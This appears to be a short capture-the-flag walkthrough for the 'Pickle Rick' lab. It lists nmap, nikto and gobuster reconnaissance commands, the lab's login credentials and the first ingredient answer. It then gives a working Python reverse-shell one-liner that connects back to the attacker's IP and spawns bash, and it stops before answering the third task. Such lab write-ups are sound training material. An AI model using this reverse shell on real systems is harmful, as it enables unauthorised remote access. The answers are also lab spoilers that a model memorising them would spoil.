# Picle Rick

```
export IP=10.10.46.210
```

# Nmap (to scan open hosts)

```
nmap -sC -sV -oN nmap/initial IP 
```
# Nikto

```
nikto -h http://$IP | tee nikto.log
```

# Gobuster

```
gobuster dir -u http://$IP -w /opt/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
```

# Command Pannel
```
grep -P . (To read all files in folder)
```

# Tasks

1. What is the first ingredient Rick needs?

```
Username = R1ckRul3s
```
```
robots.txt = Wubbalubbadubdub (password)
```
```
Command Panel: less Sup3rS3cretPickl3Ingred.txt
```
```
Answer is mr. meeseek hair
```


2. What is the second ingredient Rick needs?

Getting a reverse shell:

```
ip addr show tun0 (show my ip)

10.4.32.95
```
```
nc -lnvp 9999
```
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.32.95",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

3. What is the final ingredient Rick needs?